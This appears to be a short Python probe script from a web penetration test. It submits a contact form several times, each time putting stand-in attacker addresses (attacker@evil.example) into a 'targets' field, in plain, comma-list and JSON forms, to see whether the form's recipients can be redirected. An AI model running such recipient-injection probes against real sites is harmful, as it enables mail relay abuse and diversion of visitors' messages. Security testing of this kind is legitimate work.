import sys, uuid
sys.path.insert(0,".")
from send import send

def T(name, targets, extra=None, files=None):
    f=dict(fname="Test", lname="User", areacode="+973", tel="3600000", cname="VAPT",
           subject="Enquiry", msg="probe "+uuid.uuid4().hex[:6], check="", targets=targets)
    if extra: f.update(extra)
    c,h,b=send(f, files=files)
    print(f"[{name}] {c} {b[:400]}")
    return c,b

T("single-email","attacker@evil.example")
T("name-addr","IC Test <attacker@evil.example>")
T("two-recipients","attacker@evil.example, second@evil.example")
T("array-json",'["attacker@evil.example"]')
T("object-json",'{"email":"attacker@evil.example"}')
